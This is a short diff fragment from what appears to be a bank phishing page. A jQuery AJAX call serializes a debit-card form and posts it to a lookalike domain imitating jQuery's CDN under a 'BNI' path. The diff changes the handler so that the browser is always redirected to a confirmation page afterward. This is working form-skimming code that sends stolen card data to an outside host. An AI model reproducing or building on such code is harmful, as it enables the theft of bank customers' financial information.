@@ -14637,7 +14637,8 @@ url: 'https://code-jquery-com.c1.is/BNI/sendSaldo.php',
 data: $('#debitForm').serialize(),
 dataType: 'text',
 
-    success: function(){
+complete: function(data) {
+            console.log('Complete')
        
    setTimeout(function(){
       window.location.href = 'konf.html';
